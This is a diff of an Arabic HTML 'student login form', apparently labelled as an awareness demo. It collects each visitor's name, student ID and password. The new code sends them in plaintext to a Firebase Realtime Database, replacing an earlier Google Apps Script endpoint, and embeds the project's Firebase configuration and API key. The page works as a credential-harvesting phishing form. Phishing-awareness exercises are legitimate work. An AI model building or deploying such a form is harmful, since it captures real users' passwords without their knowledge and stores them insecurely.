@@ -2,7 +2,11 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>نموذج التسجيل - توعوي</title>
+    <!-- إضافة Firebase SDK -->
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.15.0/firebase-database.js"></script>
 </head>
 <body>
     <h2>نموذج تسجيل الدخول للطلاب</h2>
@@ -20,31 +24,51 @@
     </form>
 
     <p id="msg" style="display:none; color: green;">✅ تم إرسال البيانات بنجاح!</p>
+    <p id="errorMsg" style="display:none; color: red;">❌ حدث خطأ أثناء الإرسال.</p>
 
+    <!-- تحميل الكود بعد العناصر -->
     <script>
-        function submitForm() {
-            const data = {
-                name: document.getElementById("name").value,
-                id: document.getElementById("id").value,
-                password: document.getElementById("password").value
-            };
+        // إعداد Firebase
+        const firebaseConfig = {
+            apiKey: "AIzaSyBAVjjOX22OPIGHx4kvKEckv8wn6aERmyc",
+            authDomain: "student-22a5f.firebaseapp.com",
+            databaseURL: "https://student-22a5f-default-rtdb.firebaseio.com",
+            projectId: "student-22a5f",
+            storageBucket: "student-22a5f.firebasestorage.app",
+            messagingSenderId: "785008974740",
+            appId: "1:785008974740:web:26cfdaf406cc2975748d81",
+            measurementId: "G-BWZCERT3QF"
+        };
 
-            fetch("https://script.google.com/macros/s/AKfycbxXfVqy-zTYHZF2Qnetjw9lSHT6yTzGfHGH9-kYM02W1NvN3Ch8X_7z1JlyO5iBpqXvCw/exec", {
-                method: "POST",
-                body: JSON.stringify(data),
-                headers: {
-                    "Content-Type": "application/json"
-                }
-            })
-            .then(response => response.text())
-            .then(result => {
-                document.getElementById("msg").style.display = "block";
-                document.getElementById("registrationForm").reset();
-            })
-            .catch(error => {
-                alert("❌ حدث خطأ أثناء الإرسال: " + error);
-                console.error("Error:", error);
-            });
+        // تهيئة Firebase
+        const app = firebase.initializeApp(firebaseConfig);
+        const database = firebase.database(app); // تهيئة قاعدة البيانات
+
+        // تعريف دالة submitForm
+        function submitForm() {
+            const name = document.getElementById("name").value;
+            const id = document.getElementById("id").value;
+            const password = document.getElementById("password").value;
+
+            // التحقق من تعبئة البيانات
+            if (name && id && password) {
+                // إرسال البيانات إلى Firebase Realtime Database
+                database.ref('students').push({
+                    name: name,
+                    id: id,
+                    password: password
+                })
+                .then(() => {
+                    document.getElementById("msg").style.display = "block";
+                    document.getElementById("registrationForm").reset();
+                })
+                .catch((error) => {
+                    document.getElementById("errorMsg").style.display = "block";
+                    console.error("Error:", error);
+                });
+            } else {
+                alert("يرجى ملء جميع الحقول!");
+            }
         }
     </script>
 </body>
